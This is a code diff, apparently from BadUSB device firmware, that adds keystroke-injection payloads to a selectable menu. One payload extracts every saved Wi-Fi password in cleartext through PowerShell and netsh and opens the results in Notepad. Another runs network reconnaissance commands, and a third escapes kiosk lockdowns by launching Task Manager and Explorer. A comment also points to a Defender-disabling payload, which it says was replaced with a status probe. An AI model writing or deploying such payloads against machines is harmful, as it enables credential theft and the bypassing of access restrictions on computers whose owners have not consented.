@@ -522,6 +522,44 @@ static const char PAY_WIN_WIFI_LIST[] =
     "STRING netsh wlan show profiles\n"
     "ENTER\n";
 
+/* Extract saved WiFi passwords with cleartext keys and display in Notepad. */
+static const char PAY_WIN_WIFI_GRABBER[] =
+    "REM Dump saved WiFi profiles and plaintext keys to temp and open in Notepad.\n"
+    "DELAY 800\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING powershell\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRING (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name=\"$n\" key=clear} | Out-File \"$env:TEMP\\wifi_keys.txt\"\n"
+    "ENTER\n"
+    "DELAY 600\n"
+    "STRING notepad \"$env:TEMP\\wifi_keys.txt\"\n"
+    "ENTER\n";
+
+/* Quick network audit and active socket connections triage. */
+static const char PAY_WIN_QUICK_AUDIT[] =
+    "REM Quick network audit and active socket connections.\n"
+    "DELAY 600\n"
+    "GUI r\n"
+    "DELAY 400\n"
+    "STRING cmd /k \"ipconfig /all & arp -a & netstat -ano\"\n"
+    "ENTER\n";
+
+/* Escape kiosk fullscreens by launching Taskmgr and Explorer. */
+static const char PAY_WIN_KIOSK_ESCAPE[] =
+    "REM Escape restricted kiosk fullscreen.\n"
+    "DELAY 400\n"
+    "GUI r\n"
+    "DELAY 400\n"
+    "STRING taskmgr\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "GUI r\n"
+    "DELAY 400\n"
+    "STRING explorer.exe\n"
+    "ENTER\n";
+
 /* src: https://github.com/UberGuidoZ/Flipper/blob/main/BadUSB/UNC0V3R3D-BadUSB-Collection/Windows_Badusb/Execution/Disable_WinDefender/Disable_WinDefender.txt
  * (Replaced with a non-destructive Defender status probe.) */
 static const char PAY_WIN_DEFENDER_STATUS[] =
@@ -1270,6 +1308,9 @@ static const payload_t BADUSB_WIN_PAYLOADS[] = {
     { "ipconfig /renew",   PAY_WIN_IPCONFIG_RENEW     },
     { "Check Updates",     PAY_WIN_CHECK_UPDATES      },
     { "WiFi Profiles",     PAY_WIN_WIFI_LIST          },
+    { "WiFi Passwords",    PAY_WIN_WIFI_GRABBER       },
+    { "Net Audit Triage",  PAY_WIN_QUICK_AUDIT        },
+    { "Kiosk Escape",      PAY_WIN_KIOSK_ESCAPE       },
     { "List USB Dev",      PAY_WIN_LIST_USB           },
     { "Sysinfo Print",     PAY_WIN_SYSINFO_PRINT      },
     { "Local Recon",       PAY_WIN_RECON_LOCAL        },
